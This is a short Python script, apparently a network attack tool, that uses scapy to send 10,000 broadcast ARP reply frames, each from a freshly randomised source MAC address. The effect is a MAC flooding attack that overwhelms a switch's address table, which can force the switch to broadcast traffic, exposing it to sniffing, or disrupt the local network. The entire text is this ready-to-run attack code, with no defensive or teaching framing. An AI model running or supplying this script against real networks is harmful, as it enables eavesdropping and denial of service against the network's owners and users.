from random import randint
from scapy.all import *

def genMAC():                                   #cette fonction genere des adresses MAC aleatoire
    Mac = [0x00]+[randint(0x00, 0xff) for i in range(5)]
    return ':'.join(map(lambda x: "%02x" % x, Mac))

for i in range(10000):
    randMAC = genMAC()
    print("the mac sent is : " + randMAC)
    destMAC = 'FF:FF:FF:FF:FF:FF'
    sendp(Ether(src=randMAC, dst=destMAC) / ARP(op=2, psrc="0.0.0.0",hwdst=destMAC)/Padding(load="X"*18), verbose=0)





